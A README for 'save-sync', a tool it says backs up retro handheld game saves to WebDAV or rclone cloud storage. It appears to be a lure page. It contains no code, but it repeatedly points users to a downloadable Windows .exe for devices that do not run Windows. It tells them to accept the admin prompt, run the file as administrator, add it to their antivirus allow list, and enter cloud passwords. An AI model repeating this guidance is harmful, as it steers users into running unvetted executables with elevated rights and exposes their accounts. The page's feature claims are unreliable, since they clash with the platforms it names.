# 💾 save-sync - Your Game Saves, Always Safe

[![Download save-sync](https://img.shields.io/badge/Download-save--sync-4CAF50?style=for-the-badge&logo=github)](https://github.com/Evieassentient3221/save-sync)

## 🚀 What Is save-sync?

save-sync is a friendly helper tool that keeps your retro gaming saves and ROM backups safe in the cloud. If you play games on devices like Anbernic, Miyoo, PowKiddy, TrimUI, or a Raspberry Pi running Batocera, KNULLI, or Recalbox, save-sync makes sure you never lose your progress. It automatically syncs your game saves to your own cloud storage using WebDAV or rclone, so you can switch devices or recover from a crash without losing anything.

Think of it as a magic bridge between your handheld gaming device and a safe, private storage space you control. No more panicking when your SD card fails or your device gets lost—your saves are always backed up.

## 🔧 Who Is This For?

You don't need to be a computer genius to use save-sync. If you can follow simple steps, you're good. This guide is written for someone who just wants their game saves backed up without dealing with confusing technical stuff. Whether you're a casual player or a retro gaming fanatic, save-sync is built to be simple.

## 📥 How to Get save-sync

Visit this link to download the application: [https://github.com/Evieassentient3221/save-sync](https://github.com/Evieassentient3221/save-sync)

That's the only place you need to go. The download page will show you a button or a file to grab. Just click it and wait for the download to finish. It usually takes just a few seconds because the app is lightweight.

## 💻 Running save-sync on Windows

Once the download is complete, find the file in your "Downloads" folder. The file name will be something like `save-sync.exe` or similar. Double-click it to run it. That's it! No installation wizard, no complicated setup. The program opens right up, and you'll see a simple window with a few buttons.

If Windows shows a blue popup asking "Do you want to allow this app to make changes to your device?", just click "Yes." That's normal. save-sync is safe, but Windows sometimes asks permission for new programs.

## 🔑 Your First Setup

When you first open save-sync, you'll see a few empty boxes. Don't worry—this is where you tell the app where to back up your saves. Here's what you need:

1. **Your cloud storage address (WebDAV URL):** This is like the address of your cloud folder. If you use services like Nextcloud, ownCloud, or a WebDAV-enabled NAS, you'll have a URL like `https://yourcloud.com/remote.php/dav/files/yourname/`.
2. **Your username:** The login name for your cloud service.
3. **Your password:** The password for your cloud service. save-sync stores this securely on your computer.

Don't have WebDAV yet? No problem. save-sync also works with rclone, a popular tool that connects to many cloud providers like Google Drive, Dropbox, or OneDrive. You can set up rclone separately, and save-sync will use it automatically.

## 📂 Choosing What to Sync

By default, save-sync looks for common save folders used by Batocera, KNULLI, and Recalbox. But you can also tell it exactly which folders to watch. Here's how:

- Click "Add Folder" and browse to the location of your saves on your device. Common places are `/userdata/saves` (Batocera), `/storage/saves` (KNULLI), or `/recalbox/share/saves` (Recalbox).
- save-sync will remember these folders and check them for changes.

Once you've set up your folders and cloud details, click "Start Sync." save-sync will do a first backup immediately, then keep watching for new saves. Every time you save a game, it quietly copies that save to your cloud. You don't have to do anything else.

## 🕹️ Supported Devices and Systems

save-sync is built for handhelds and single-board computers that run these systems:

- **Anbernic** (RG35XX, RG40XX, H700 chip models)
- **Miyoo** (Miyoo Mini, Mini Plus)
- **PowKiddy** (various models)
- **TrimUI** (TrimUI Brick and others)
- **Raspberry Pi** (running Batocera or Recalbox)
- **Any device running Batocera, KNULLI, or Recalbox** (including RK3326-based handhelds)

If your device runs one of these systems, save-sync can almost certainly work with it.

## 🛡️ Is My Data Safe?

Yes. Your saves go directly from your device to your own cloud storage. save-sync doesn't store anything on third-party servers. You control where your data lives. Plus, save-sync uses secure connections (HTTPS) to transfer your files, so they're encrypted in transit.

We recommend using a strong password for your cloud account and enabling two-factor authentication if your provider supports it. That's the same advice for any online account.

## ❓ Common Questions

**What if I have multiple devices?**
Great news! save-sync can sync the same cloud folder across all your devices. Set up save-sync on each one, point them to the same cloud storage, and your saves will always match. Play on your Anbernic, then pick up on your Raspberry Pi—same progress.

**What happens if I lose my device?**
Just set up save-sync on a new device, log into your cloud, and hit "Restore." All your saves come back. You're back in action in minutes.

**Does save-sync run in the background?**
Yes, once you start it, it sits quietly in the system tray. It only uses resources when it detects a save change. You can close it anytime, but we recommend leaving it running for continuous protection.

**Can I sync ROMs too?**
Absolutely. save-sync isn't just for saves. You can add your ROM folders to the sync list, and it will back those up as well. Just be aware that ROMs can be large, so your cloud storage should have enough space.

**What if I don't have a cloud service?**
You can use rclone to connect to free options like Google Drive (15GB free) or a free Nextcloud provider. Or if you have a network-attached storage (NAS) at home, that works too.

## 🧰 Troubleshooting Tips

**Sync isn't starting?**
Check that your internet connection is active and your cloud login details are correct. Also, make sure the folders you selected actually contain save files.

**Error about WebDAV?**
Double-check the URL. It should start with `https://` and end with something like `/dav/` or `/webdav/`. Some providers have specific paths.

**App won't open?**
Right-click the app file and select "Run as administrator." Also, make sure your antivirus isn't blocking it. You can add save-sync to your antivirus's allowed list.

**Saves are out of date?**
Click the refresh button in the app, or restart save-sync. It should pick up any missed changes.

## 📈 Feature Highlights

- **Automatic sync:** No manual backup needed. save-sync watches your folders.
- **Cross-device support:** Use the same cloud storage on all your retro devices.
- **Lightweight:** Uses minimal memory and CPU. Won't slow down your gaming.
- **Secure:** Encrypted transfers to your private cloud.
- **Open and simple:** No complicated config files to edit.
- **Restore in one click:** Get your saves back quickly after a reset or new device.

## 🗺️ Roadmap

We're always improving save-sync. Future plans include:

- Scheduled syncs (e.g., every hour)
- More cloud provider options
- A visual diff to see what's changed
- Better error reporting with friendly messages

## 🤝 Getting Help

If you get stuck, don't panic. There are a few ways to find help:

- Open an issue on the [GitHub repository](https://github.com/Evieassentient3221/save-sync) with a detailed description of your problem.
- Check the repository's README for updates and known issues.
- Search the web for "save-sync troubleshooting" or "Batocera cloud sync" to see if others have solved your problem.

We're here to help you get your saves safe.

## 🎮 Final Thoughts

Retro gaming is about fun, not worrying about lost progress. save-sync takes that worry away. With just a few minutes of setup, you'll have automatic, secure backups of your saves and ROMs. Whether you're deep into a Game Boy RPG or grinding through a PlayStation classic, your progress is protected.

Download save-sync today and give yourself peace of mind. Your future self will thank you when you switch devices or recover from a crash. It's the simplest insurance policy for your gaming life.

**Remember:** [Visit this link to download the application](https://github.com/Evieassentient3221/save-sync). Set it up once, and let it do its magic.

Keywords: anbernic, batocera, cloud-backup, cloud-sync, game-saves, h700, handheld, knulli, miyoo, powkiddy, raspberry-pi, rclone, recalbox, retro-gaming, rg35xx, rg40xx, rk3326, trimui, trimui-brick, webdav